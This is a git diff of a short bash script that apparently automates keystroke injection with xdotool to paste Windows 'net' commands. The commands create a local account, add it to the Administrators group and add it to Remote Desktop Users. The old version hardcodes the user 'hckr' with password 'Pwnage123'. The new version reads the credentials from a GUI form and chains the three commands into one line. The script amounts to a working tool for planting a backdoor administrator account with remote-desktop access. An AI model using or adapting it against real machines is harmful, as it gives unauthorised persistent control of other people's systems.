@@ -1,16 +1,17 @@
 #!/bin/bash
 
 : '
-Net: Add user hckr, add to administrators and RDP groups.
+Net: Add use, add to administrators and RDP groups.
 '
 
 source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
+source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
 
-paste_command "net user hckr Pwnage123 /add"
-xdotool key Return
+# Generate gui form
+generate_form "Username" "Password"
 
-paste_command "net localgroup administrators hckr /add"
-xdotool key Return
+USERNAME=${form_data["Username"]}
+PASSWORD=${form_data["Password"]}
 
-paste_command "net localgroup \"Remote Desktop Users\" hckr /add"
+paste_command "net user ${USERNAME} ${PASSWORD} /add && net localgroup administrators ${USERNAME} /add && net localgroup \"Remote Desktop Users\" ${USERNAME} /add"
 xdotool key Return
